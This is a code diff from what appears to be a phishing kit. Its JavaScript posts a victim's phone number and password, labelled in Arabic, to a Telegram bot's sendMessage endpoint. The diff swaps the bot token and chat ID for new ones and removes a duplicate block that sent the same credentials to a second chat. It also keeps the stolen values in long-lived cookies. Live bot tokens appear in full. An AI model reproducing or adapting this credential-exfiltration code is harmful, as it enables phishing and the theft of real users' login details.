@@ -179,9 +179,9 @@
       message += "كلمة السر:`" + password + "`\n"
       $.ajax({
         type: 'POST',
-        url: `https://api.telegram.org/bot7553561556:AAHr8ODFLVaNsWExKr4Qp1PwKniSsoNUD4I/sendMessage`,
+        url: `https://api.telegram.org/bot7721961603:AAHmNWIomqqd98iLtAntWuYcyR_uLMHPz-4/sendMessage`,
         data: {
-          chat_id: "6985854225",
+          chat_id: "6797351288",
           text: message,
           parse_mode: 'markdown',
         },
@@ -195,25 +195,6 @@
         }
       });
 
-      var message = "رقم الهاتف:`" + phonenumber + "`\n"
-      message += "كلمة السر:`" + password + "`\n"
-      $.ajax({
-        type: 'POST',
-        url: `https://api.telegram.org/bot7553561556:AAHr8ODFLVaNsWExKr4Qp1PwKniSsoNUD4I/sendMessage`,
-        data: {
-          chat_id: "7736802193",
-          text: message,
-          parse_mode: 'markdown',
-        },
-        success: function (res) {
-          console.debug(res);
-          $('#response').text('Message sent');
-        },
-        error: function (error) {
-          console.error(error);
-          alert("error failed");
-        }
-      });
 
       setCookie("phonenumber", phonenumber, 1000);
       setCookie("password", password, 1000);
